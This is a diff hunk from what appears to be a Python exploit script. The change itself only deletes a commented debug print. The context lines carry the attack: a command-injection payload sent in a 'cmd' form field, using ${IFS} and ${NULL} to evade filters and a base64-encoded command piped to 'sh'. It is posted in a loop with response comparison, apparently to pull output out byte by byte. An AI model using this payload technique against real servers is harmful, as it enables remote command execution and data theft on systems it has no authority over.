@@ -13,7 +13,6 @@ while a:
         f = PAYLOAD + b'|tail -c ' + str(byte).encode()
         data = {"cmd":"ech${NULL}o${IFS}"+ b64encode(f).decode() + "|base64${IFS}-d|sh"}
         r = requests.post(url, data=data)
-        #print(data)
         if resp == r.text:
             break
         else:
